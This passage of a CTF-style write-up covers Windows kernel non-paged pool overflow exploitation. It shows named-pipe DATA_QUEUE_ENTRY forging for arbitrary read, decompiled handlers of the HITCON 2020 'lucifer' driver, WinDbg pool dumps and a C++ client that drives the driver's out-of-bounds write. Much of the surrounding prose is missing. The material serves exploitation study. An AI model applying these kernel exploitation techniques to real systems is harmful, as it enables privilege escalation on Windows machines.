)</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = Size + <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)Size + <span class="number">0x30</span> &lt; (<span class="type">unsigned</span> <span class="type">int</span>)Size )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">NpFreeClientSecurityContext</span>(v12);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xC000000D</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = *(_DWORD *)(a3 + <span class="number">28</span>) - *(_DWORD *)(a3 + <span class="number">32</span>);</span><br><span class="line">    v15 = Size - a9;</span><br><span class="line">    <span class="keyword">if</span> ( v24 &lt; (<span class="type">int</span>)Size - a9 )</span><br><span class="line">      v15 = *(_DWORD *)(a3 + <span class="number">28</span>) - *(_DWORD *)(a3 + <span class="number">32</span>);</span><br><span class="line">    v26 = v15;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">0x30</span> &amp;&amp; _interlockedbittestandreset((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)(a3 + <span class="number">40</span>), <span class="number">0</span>) )</span><br><span class="line">      v16 = *(_QWORD *)(a3 + <span class="number">40</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v16 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    v16 = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x41</span>i64, v14, <span class="string">&#x27;rFpN&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = v26;</span><br><span class="line">LABEL_14:</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">36</span>) = v15;</span><br><span class="line">      *(_QWORD *)(v16 + <span class="number">16</span>) = v13;</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(v16 + <span class="number">24</span>) = v12;</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">40</span>) = Size;</span><br><span class="line">      <span class="keyword">if</span> ( a4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v13 )</span><br><span class="line">          v22 = *(<span class="type">const</span> <span class="type">void</span> **)(v13 + <span class="number">112</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v22 = a8;</span><br><span class="line">        <span class="built_in">memmove</span>((<span class="type">void</span> *)(v16 + <span class="number">48</span>), v22, (<span class="type">unsigned</span> <span class="type">int</span>)Size);</span><br><span class="line">        <span class="keyword">if</span> ( v24 &lt; (<span class="type">int</span>)Size - a9 &amp;&amp; v13 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = <span class="number">259</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)(v16 + <span class="number">16</span>) = <span class="number">0</span>i64;</span><br><span class="line">          v17 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">259</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_51:</span><br><span class="line">    <span class="built_in">NpFreeClientSecurityContext</span>(v12);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225626</span>i64;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="NonPagedPool-Overflow"><a href="#NonPagedPool-Overflow" class="headerlink" title="NonPagedPool Overflow"></a>NonPagedPool Overflow</h3><p><a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows-Non-Paged-Pool-Overflow-Exploitation</a></p><p></p><p>exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">Al20c</span><span class="params">(<span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">buf[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">All0c</span><span class="params">(<span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">buf[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unbuffered pipe</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSYSCALLAPI NTSTATUS <span class="title">NtFsControlFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  HANDLE           Event,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PIO_APC_ROUTINE  ApcRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PVOID            ApcContext,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]           PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            FsControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PVOID            InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            InputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PVOID            OutputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            OutputBufferLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//create the pipe/file in FILE_FLAG_OVERLAPPED mode (blocking mode)</span></span><br><span class="line"><span class="built_in">NtFsControlFile</span>(pipe_handle, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;isb, <span class="number">0x119FF8</span>, buf, sz, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p> DATA_QUEUE_ENTRY</p><p>IRP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry=whatever;</span><br><span class="line"> Irp=Forged IRP Address;</span><br><span class="line"> SecurityContext=ideally <span class="number">0</span>;</span><br><span class="line"> EntryType=<span class="number">1</span>;  <span class="comment">// unbuffered</span></span><br><span class="line"> QuotaInEntry=ideally <span class="number">0</span>;</span><br><span class="line"> DataSize=arbitrary read size;</span><br><span class="line"> x=whatever;</span><br><span class="line"> </span><br><span class="line">IRP-&gt;SystemBuffer = arbitrary read address</span><br></pre></td></tr></table></figure><p>DataSize</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry=whatever;</span><br><span class="line"> Irp=ideally <span class="number">0</span>;</span><br><span class="line"> SecurityContext=ideally <span class="number">0</span>;</span><br><span class="line"> EntryType=<span class="number">0</span>;</span><br><span class="line"> QuotaInEntry=ideally <span class="number">0</span>; <span class="comment">//mostly irrelevent in case we use the peek operation</span></span><br><span class="line"> DataSize=something bigger than the original size;</span><br><span class="line"> x=whatever;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">HITCON 2020 lucifer</a></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>Queue</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>DATA_QUEUE_ENTRYwindows<code>entry-&gt;Flink-&gt;Blink!=entry</code></p><p><code>PeekNamedPipe</code> </p><h4 id="overflow-"><a href="#overflow-" class="headerlink" title="overflow-&gt;"></a>overflow-&gt;</h4><p>1</p><h3 id="HITCON-2020-lucifer"><a href="#HITCON-2020-lucifer" class="headerlink" title="HITCON 2020 lucifer"></a>HITCON 2020 lucifer</h3><p><a href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">lucifer</a>Windows 10 Pro 20H2 <code>cmd.exe</code></p><p>OOB writeangleboyPPTPPT</p><p></p><p>CreateNonPagedPoolNx0x400chunk</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222000</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create\n&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">sub_1400051DC</span>();</span><br><span class="line">  <span class="keyword">goto</span> LABEL_16;</span><br><span class="line"><span class="function">__int64 <span class="title">sub_1400051DC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  PVOID PoolWithTag; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  PoolWithTag = Destination;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination )</span><br><span class="line">  &#123;</span><br><span class="line">    PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>((POOL_TYPE)<span class="number">512</span>, <span class="number">0x400</span>ui64, <span class="number">0x6963754C</span>u); </span><br><span class="line">    Destination = PoolWithTag;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !PoolWithTag )</span><br><span class="line">    v0 = <span class="number">0xC0000017</span>;</span><br><span class="line">  <span class="built_in">RtlZeroMemory</span>(PoolWithTag, <span class="number">0</span>i64, <span class="number">1024</span>i64);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ADD: system buffer </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222004</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;ADD\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SystemBuffer &amp;&amp; InputBufferLength &gt;= <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">v11 = SystemBuffer[<span class="number">2</span>];</span><br><span class="line">v13 = *(_OWORD *)SystemBuffer;          <span class="comment">// SystemBuffer</span></span><br><span class="line">v14 = v11;</span><br><span class="line">v8 = <span class="built_in">sub_140001028</span>(&amp;v13);</span><br><span class="line"><span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001028</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination || a1[<span class="number">1</span>] != <span class="number">0xDADADDAA</span>i64 )</span><br><span class="line">    result = <span class="number">0xC0000022</span>i64;</span><br><span class="line">  *((_QWORD *)Destination + *a1) = a1[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222008</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;GET\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SystemBuffer &amp;&amp; OutputBufferLength &gt;= <span class="number">0x18</span> &amp;&amp; InputBufferLength &gt;= <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">v9 = SystemBuffer[<span class="number">2</span>];</span><br><span class="line">v13 = *(_OWORD *)SystemBuffer;</span><br><span class="line">v14 = v9;</span><br><span class="line">v8 = <span class="built_in">sub_14000107C</span>(&amp;v13);</span><br><span class="line">v10 = v14;</span><br><span class="line">*(_OWORD *)SystemBuffer = v13;</span><br><span class="line">SystemBuffer[<span class="number">2</span>] = v10;</span><br><span class="line">a2-&gt;IoStatus.Information = <span class="number">24</span>i64;</span><br><span class="line"><span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_14000107C</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination || a1[<span class="number">1</span>] != <span class="number">3671776682</span>i64 )</span><br><span class="line">    v1 = <span class="number">-1073741790</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &lt; <span class="number">0x80</span>ui64 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[<span class="number">2</span>] = *((_QWORD *)Destination + *a1);</span><br><span class="line">    a1[<span class="number">1</span>] = <span class="number">3735928559</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Releasefreechunk</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22200C</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;Release\n&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">sub_1400010E0</span>();</span><br><span class="line"><span class="function">__int64 <span class="title">sub_1400010E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( Destination )</span><br><span class="line">    <span class="built_in">ExFreePoolWithTag</span>(Destination, <span class="number">0x6963754C</span>u);</span><br><span class="line">  Destination = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ADD</p><p>WritePipe</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ExAllocatePoolWithTag</span>(NonpagedPoolNx, <span class="built_in">sizeof</span>(payload)+<span class="number">0x30</span>, tag)</span><br></pre></td></tr></table></figure><p>pipe<code>DATA_QUEUE_ENTRY</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DATA_QUEUE_ENTRY</span>&#123;</span><br><span class="line">    LIST_ENTRY Queue;        <span class="comment">// </span></span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    __int64 SecurityContext;</span><br><span class="line">    <span class="type">int</span> EntryType;</span><br><span class="line">    <span class="type">int</span> QuotaInEntry;</span><br><span class="line">    <span class="type">int</span> DataSize;           <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">&#125; DATA_QUEUE_ENTRY,*PDATA_QUEUE_ENTRY;</span><br></pre></td></tr></table></figure><p>Debug0x440,  <code>!pool</code> pool header</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; lm m Luc*</span><br><span class="line">Browse full module list</span><br><span class="line"><span class="built_in">start</span>             end                 module name</span><br><span class="line">fffff800`<span class="number">40</span>b70000 fffff800`<span class="number">40</span>b78000   Lucifer    (deferred)             </span><br><span class="line"><span class="number">0</span>: kd&gt; ba e1 fffff800`<span class="number">40</span>b70000+<span class="number">0</span>x5200</span><br><span class="line"><span class="number">0</span>: kd&gt; g</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; p</span><br><span class="line">Lucifer+<span class="number">0</span>x5206:</span><br><span class="line">fffff800`<span class="number">40</span>b75206 <span class="number">48890513</span>deffff  mov     qword ptr [Lucifer+<span class="number">0</span>x3020 (fffff800`<span class="number">40</span>b73020)],rax</span><br><span class="line"><span class="number">1</span>: kd&gt; r rax</span><br><span class="line">rax=ffff9a882f51c460</span><br><span class="line"><span class="number">1</span>: kd&gt; !pool ffff9a882f51c460</span><br><span class="line">Pool page ffff9a882f51c460 region is Nonpaged pool</span><br><span class="line"> ffff9a882f51c000 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  RLin</span><br><span class="line">*ffff9a882f51c450 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> ffff9a882f51c8b0 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  Viaa</span><br><span class="line"> ffff9a882f51cd10 size:  <span class="number">220</span> previous size:    <span class="number">0</span>  (Allocated)  AleP</span><br><span class="line"> ffff9a882f51cf30 size:   b0 previous size:    <span class="number">0</span>  (Free)       Y..=</span><br></pre></td></tr></table></figure><p>0x4000x440 &#x3D; 0x10 pool header + 0x400 chunk + 0x30 padding</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !pool FFFFA489243E4A20</span><br><span class="line">unable to get nt!PspSessionIdBitmap</span><br><span class="line">Pool page ffffa489243e4a20 region is Nonpaged pool</span><br><span class="line"> ffffa489243e4000 size:  a00 previous size:    <span class="number">0</span>  (Allocated)  Thre</span><br><span class="line">*ffffa489243e4a10 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">Owning component : <span class="built_in">Unknown</span> (update pooltag.txt)</span><br><span class="line"> ffffa489243e4e50 size:  <span class="number">190</span> previous size:    <span class="number">0</span>  (Free)       .l.:</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq FFFFA489243E4A20 L88</span><br><span class="line">ffffa489`<span class="number">243e4</span>a20  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`deadbeef</span><br><span class="line"># ...</span><br><span class="line">ffffa489`<span class="number">243e4</span>e10  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`deadbeef</span><br><span class="line">ffffa489`<span class="number">243e4</span>e20  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e30  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e40  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e50  ba816c05`<span class="number">08f</span>395a9 <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hDevice;</span><br><span class="line">DWORD dwRet;</span><br><span class="line">BOOL stat;</span><br><span class="line">hDevice = <span class="built_in">CreateFileW</span>(</span><br><span class="line">DEVICE_NAME,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[-] Error CreateFileW&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">hDevice,</span><br><span class="line"><span class="number">0x222000</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;dwRet,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (!stat)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[-] Error DeviceIoControl&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ADD</span></span><br><span class="line">UINT64 data[<span class="number">3</span>];</span><br><span class="line">data[<span class="number">1</span>] = <span class="number">0xDADADDAA</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i++) &#123;</span><br><span class="line">data[<span class="number">0</span>] = i;</span><br><span class="line">data[<span class="number">2</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">hDevice,</span><br><span class="line"><span class="number">0x222004</span>,</span><br><span class="line">&amp;data, <span class="built_in">sizeof</span>(data),</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;dwRet,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[+] ADD Done&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="comment">// release</span></span><br><span class="line">stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">hDevice,</span><br><span class="line"><span class="number">0x22200</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;dwRet,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p></p><ul><li>chunk: 0x800 + 0x7c0</li><li>0x800 pipe</li><li></li></ul><p></p><ul><li>,,FreeChunkTree.</li><li>,0x10000VS,FreeChunkTree.</li><li>,,,31,FreeChunkTree,31,,.</li></ul><p></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>: kd&gt; !pool FFFF8981621A6010</span><br><span class="line">unable to get nt!PspSessionIdBitmap</span><br><span class="line">Pool page ffff8981621a6010 region is Nonpaged pool</span><br><span 